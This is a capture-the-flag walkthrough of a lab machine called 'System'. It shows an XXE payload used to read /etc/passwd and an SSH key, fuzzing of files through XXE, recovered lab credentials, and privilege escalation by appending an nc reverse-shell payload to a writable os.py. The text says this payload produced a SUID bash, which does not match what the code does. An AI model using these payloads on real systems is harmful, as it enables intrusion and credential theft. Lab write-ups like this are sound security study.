+++
title = "System - Walkthrough"
date = "2026-07-22"
author = "nvru"
description = "Walkthrough for the System machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "nginx",
  "xxe",
  "ssh",
  "python-library-hijacking",
  "privilege-escalation",
  "easy"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.35`

The objective was to enumerate the target, identify exposed services, gain initial access by exploiting an XXE vulnerability to recover SSH credentials, and escalate privileges through Python library hijacking.

![Machine information](/images/hmv/system/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.35 -- -sC -sV -A -oA nmap/rust
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5
80/tcp open  http    nginx 1.18.0
```

Only SSH and an Nginx web server were exposed, making the web application the obvious starting point.

---

## Enumeration

### Web Enumeration

Browsing to the website presented a registration page.

![Machine information](/images/hmv/system/http.png)

Submitting the registration form did not appear to perform any useful action.

![Registration page](/images/hmv/system/http_reg.png)
Inspecting the page source revealed a JavaScript function that generated an XML document and submitted it to `magic.php`.

```javascript
function XMLFunction() {
  var xml =
    "" +
    '<?xml version="1.0" encoding="UTF-8"?>' +
    "<details>" +
    "<email>" +
    $("#email").val() +
    "</email>" +
    "<password>" +
    $("#password").val() +
    "</password>" +
    "</details>";

  xmlhttp.open("POST", "magic.php", true);
  xmlhttp.send(xml);
}
```

![JavaScript XML generation](/images/hmv/system/js_xml.png)

Since user-controlled XML was being processed by the server, the application appeared to be a good candidate for XXE testing.

---

### XXE

The following payload was submitted:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<details>
    <email>&xxe;</email>
    <password>void</password>
</details>
```

The response successfully returned the contents of `/etc/passwd`, confirming the XXE vulnerability.

![Reading /etc/passwd](/images/hmv/system/xxe_passwd.png)

From the output, the user `david` was identified.

![Reading /etc/passwd](/images/hmv/system/david_xxe.png)

---

### Reading Sensitive Files

I first attempted to recover David's SSH private key using the XXE vulnerability.

```text
/home/david/.ssh/id_rsa
```

The file was successfully read.

![SSH key](/images/hmv/system/xxe_ssh.png)

Although the private key was successfully recovered, it turned out to be a rabbit hole. SSH authentication with the key failed, so I continued searching for other sensitive files.

![SSH failed](/images/hmv/system/ssh_nop.png)

Further enumeration was required.

Using `wfuzz`, I searched for additional interesting files within David's home directory.

```bash
wfuzz \
-w /opt/wordlists/seclists/Discovery/Web-Content/quickhits.txt \
-d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE results [<!ENTITY test SYSTEM "file:///home/david/FUZZ">]><details><email>&test;</email><password>pass</password></details>' \
--hh 85 \
http://10.10.10.35/magic.php
```

The scan revealed several interesting files, including `.viminfo`.

![Directory enumeration](/images/hmv/system/fuzz_viminfo.png)

Inspecting `.viminfo` revealed that David had previously opened:

```text
/usr/local/etc/mypass.txt
```

![.viminfo](/images/hmv/system/viminfo.png)

Reading that file through XXE returned what appeared to be David's password written in leetspeak.

![Password recovered](/images/hmv/system/david_passwd.png)

---

## Initial Access

Using the recovered credentials:

```text
Username: david
Password: h4ck3rd4v!d
```

SSH authentication was successful.

![SSH login](/images/hmv/system/ssh_david.png)

---

## Privilege Escalation

### david → root

The first step was checking for common privilege escalation vectors.

```bash
sudo -l
which doas
```

Neither `sudo` nor `doas` was available.

![No sudo](/images/hmv/system/sudo_doas.png)

I also checked for Linux capabilities.

```bash
getcap -r / 2>/dev/null
```

No useful capabilities were found.

![No capabilities](/images/hmv/system/no_cap.png)

Finally, I searched for SUID binaries.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Nothing interesting appeared.

![No SUID](/images/hmv/system/no_suid.png)

---

### Python Library Hijacking

While enumerating `/opt`, I discovered an interesting script.

![Script](/images/hmv/system/opt_scr.png)

The script imported Python's `os` module while running with elevated privileges.

Since it relied on the `os` module, I checked whether the corresponding `os.py` file was writable.

```bash
find / -type f -name os.py -ls 2>/dev/null
```

The `os.py` module used by the script was writable by all users, making Python library hijacking possible.

![Writable library](/images/hmv/system/fnd_lib.png)

Initially, I inserted a payload at the beginning of the file to create a SUID shell and later attempted a reverse shell, but neither executed successfully.

After appending the payload to the end of the module instead, it executed when the privileged script imported the library.

```python
def nvru():
    import subprocess
    subprocess.run(["nc","-e","/bin/bash","10.10.10.2","9001"])
nvru()
```

Executing the vulnerable script resulted in a SUID-enabled `/bin/bash`, allowing root access.

![Root shell](/images/hmv/system/root.png)

---

## Credentials

```text
david:h4ck3rd4v!d
```

---

## Flags

```text
user:79f3964a3a0f1a050761017111efffe0

root:3aa26937ecfcc6f2ba466c14c89b92c4
```
